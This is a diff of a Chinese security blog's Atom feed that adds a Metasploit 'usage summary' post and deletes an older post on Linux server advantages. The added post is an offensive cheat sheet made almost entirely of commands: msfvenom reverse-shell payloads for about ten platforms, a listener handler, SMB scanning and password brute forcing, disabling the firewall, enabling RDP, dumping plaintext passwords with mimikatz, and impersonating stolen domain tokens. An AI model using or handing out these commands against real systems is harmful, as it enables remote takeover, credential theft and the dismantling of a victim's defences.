@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-07-13T02:10:50.111Z</updated>
+  <updated>2017-07-13T06:27:16.975Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -14,6 +14,51 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Meatsploit Framework 利用总结</title>
+    <link href="http://uknowsec.cn/posts/skill/Meatsploit-Framework-%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93.html"/>
+    <id>http://uknowsec.cn/posts/skill/Meatsploit-Framework-利用总结.html</id>
+    <published>2017-07-13T04:15:40.000Z</published>
+    <updated>2017-07-13T06:27:16.975Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="msfvenom-Payload-List"><a href="#msfvenom-Payload-List" class="headerlink" title="msfvenom Payload List"></a>msfvenom Payload List</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</div></pre></td></tr></table></figure>
+<h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</div></pre></td></tr></table></figure>
+<h3 id="Mac"><a href="#Mac" class="headerlink" title="Mac"></a>Mac</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</div></pre></td></tr></table></figure>
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</div><div class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</div></pre></td></tr></table></figure>
+<h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</div></pre></td></tr></table></figure>
+<h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure>
+<h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR"></a>WAR</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</div></pre></td></tr></table></figure>
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure>
+<h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure>
+<h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</div></pre></td></tr></table></figure>
+<h2 id="Handlers"><a href="#Handlers" class="headerlink" title="Handlers"></a>Handlers</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD &lt;Payload name&gt;</div><div class="line">set LHOST &lt;LHOST value&gt;</div><div class="line">set LPORT &lt;LPORT value&gt;</div><div class="line">set ExitOnSession false</div><div class="line">exploit -j -z</div></pre></td></tr></table></figure>
+<h2 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/portscan/tcp</div><div class="line">show options</div><div class="line">set LHOST &lt;LHOST value&gt;</div><div class="line">set LPORTS &lt;LPORT value&gt;</div><div class="line">exploit</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon2.jpg" alt=""></p>
+<h2 id="Windows-Smb模块"><a href="#Windows-Smb模块" class="headerlink" title="Windows Smb模块"></a>Windows Smb模块</h2><h3 id="扫描smb判断主机"><a href="#扫描smb判断主机" class="headerlink" title="扫描smb判断主机"></a>扫描smb判断主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_version</div><div class="line">show options</div><div class="line">exploit</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon3.jpg" alt=""></p>
+<h3 id="爆破smb密码"><a href="#爆破smb密码" class="headerlink" title="爆破smb密码"></a>爆破smb密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use auxiliary/scanner/smb/smb_login</div><div class="line">set SMBUser administrator</div><div class="line">set PASS_FILE /tmp/pass</div><div class="line">set RHOSTS 192.168.1.116</div><div class="line">exploit</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon4.jpg" alt=""></p>
+<h3 id="开启3389远程桌面"><a href="#开启3389远程桌面" class="headerlink" title="开启3389远程桌面"></a>开启3389远程桌面</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; run post/windows/manage/enable_rdp</div></pre></td></tr></table></figure>
+<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">shell</div><div class="line">netsh adcfirewall set allprofiles state off</div></pre></td></tr></table></figure>
+<h3 id="实时截图"><a href="#实时截图" class="headerlink" title="实时截图"></a>实时截图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">screenshot</div><div class="line">use espia</div></pre></td></tr></table></figure>
+<h3 id="meterpreter加载mimikatz抓取明文密码"><a href="#meterpreter加载mimikatz抓取明文密码" class="headerlink" title="meterpreter加载mimikatz抓取明文密码"></a>meterpreter加载mimikatz抓取明文密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">meterpreter&gt;load mimikatz</div><div class="line">msv</div><div class="line">kerberos</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon1.jpg" alt=""></p>
+<h3 id="窃取及伪造域账户-token"><a href="#窃取及伪造域账户-token" class="headerlink" title="窃取及伪造域账户 token"></a>窃取及伪造域账户 token</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">load incognito</div><div class="line">list_tokens -u</div><div class="line">impersonate_token xxxxx\\xxxxxxx</div><div class="line">execute -f cmd.exe -i -t</div></pre></td></tr></table></figure>
+<p><img src="http://obr4sfdq7.bkt.clouddn.com/msfvemon6.jpg" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="技巧" scheme="http://uknowsec.cn/categories/skill/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>配置漏洞之redis未授权访问</title>
@@ -2127,39 +2172,6 @@
 <h3 id="Sublime-Text-3"><a href="#Sublime-Text-3" class="headerlink" title="Sublime Text 3"></a>Sublime Text 3</h3><p>Sublime Text是一款很炫酷的编辑器，之前看代码都是用这款。</p>
 <p>下载地址：<br><a href="https://pan.baidu.com/s/1miG1YNu" target="_blank" rel="external">https://pan.baidu.com/s/1miG1YNu</a></p>
 <p>执行命令安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo dpkg -i sublime-text_build-3126_amd64.deb</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Linux" scheme="http://uknowsec.cn/categories/linux/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>Linux作为服务器操作系统的优势</title>
-    <link href="http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Linux%E4%BD%9C%E4%B8%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BC%98%E5%8A%BF.html"/>
-    <id>http://uknowsec.cn/posts/linux/第一周-Linux作为服务器操作系统的优势.html</id>
-    <published>2017-02-24T08:55:01.000Z</published>
-    <updated>2017-05-01T13:49:10.807Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>初次在课上听到老师说到，每周需要写博客的作业时。我是很惊讶的，这是第一次在传统的校园课堂拿到一个这么新鲜的作业。这可能就是传统教育与培训教育的不同之处吧。下面是老师留给我们的题目：为什么服务器端的操作系统大多数为Linux？我之前是接触过Linux的，之前用过kali linux，因此在选选修课的时候也就毫不犹豫的选择了Linux基础这门课。检索了别人的文章然后加上自己的想法写下这篇博客。</p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Linux简介"><a href="#Linux简介" class="headerlink" title="Linux简介"></a>Linux简介</h3><p>Linux是一个自由的，免费的，源码开放的操作系统。也是开源软件中最著名的例子。其最主要的目的就是为了建立不受任何商品化软件版权制约的，全世界都能使用的类Unix兼容产品.而我们将服务器部署在Linux将会更加的稳定、安全、高效以及出色的性能这时windows无法比的。</p>
-<h3 id="Linux优势"><a href="#Linux优势" class="headerlink" title="Linux优势"></a>Linux优势</h3><h4 id="费用低"><a href="#费用低" class="headerlink" title="费用低"></a>费用低</h4><p>费用问题对于一个每一个公司企业是很重的，而服务器的投入是一笔不小的开支，大家都想办法去降低服务器运维和服务器投入的成本问题。而Linux作为一个开源免费的操作系统，无疑得到了大都企业的青睐。企业可以降低更多的服务器成本，以此去填充其他方面的资金不足问题。</p>
-<h4 id="网络功能"><a href="#网络功能" class="headerlink" title="网络功能"></a>网络功能</h4><p>Linux内置了很丰富的免费网络服务器软件、数据库和网页的开发工具。如Apache、Sendmail、VSFtp、SSH、MySQL、PHP和JSP等。近年来，越来越多的企业看到了Linux的这些强大的功能，利用Linux担任全方位的网络服务器。</p>
-<h4 id="硬件支持"><a href="#硬件支持" class="headerlink" title="硬件支持"></a>硬件支持</h4><p>由于Linux的内核大部分是用C语言编写的，并采用了可移植的Unix标准应用程序接口，所以它支持如i386、Alpha、AMD和Sparc等系统平台，以及从个人电脑到大型主机，甚至包括嵌入式系统在内的各种硬件设备。</p>
-<h4 id="稳定性"><a href="#稳定性" class="headerlink" title="稳定性"></a>稳定性</h4><p>Linux内核的源代码是以标准规范的32位(在64位CPU上是64位)的计算机来做的最佳化设计，可确保其系统的稳定性。正因为Linux的稳定，才使得一些安装Linux的主机像Unix机一样常年不关而不曾宕机。</p>
-<h4 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h4><p>对于企业来说数据安全也是很重要的，在近几年企业和管理者都慢慢开始关注信息安全的问题。Linux系统的诞生就是与信息安全有渊源的，Linux之父林纳斯·托瓦兹，本来就是一名著名的黑客。在黑客的世界里，大家都崇尚共享，自由，开源的理念。所以在Linux的更新、漏洞披露和修补大多数是由一些这样的组织在进行的。在这类的努力下，Linux在基础安全和应用安全方面都是比其他系统更加出色的。</p>
-<h3 id="Linux有趣命令"><a href="#Linux有趣命令" class="headerlink" title="Linux有趣命令"></a>Linux有趣命令</h3><h4 id="cmatrix-命令"><a href="#cmatrix-命令" class="headerlink" title="cmatrix 命令"></a>cmatrix 命令</h4><p>之前在《黑客帝国》电源中看到过这类的代码流，感觉很酷。后来在学习中发现了这个命令。在终端执行如下命令即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install cmatrix</div><div class="line">$cmatrix</div></pre></td></tr></table></figure></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224155122.jpg" alt="cmatrix"></p>
-<h4 id="sl-命令"><a href="#sl-命令" class="headerlink" title="sl 命令"></a>sl 命令</h4><p>你会看到一辆火车从屏幕右边开往左边。。。。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ sudo apt-get install sl </div><div class="line">$ sl</div></pre></td></tr></table></figure></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170224155428.jpg" alt="sl"></p>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>简单的说了下Linux作为服务器操作系统的优势，部分语言引用网络，望见谅。</p>
 ]]></content>
     
     <summary type="html">
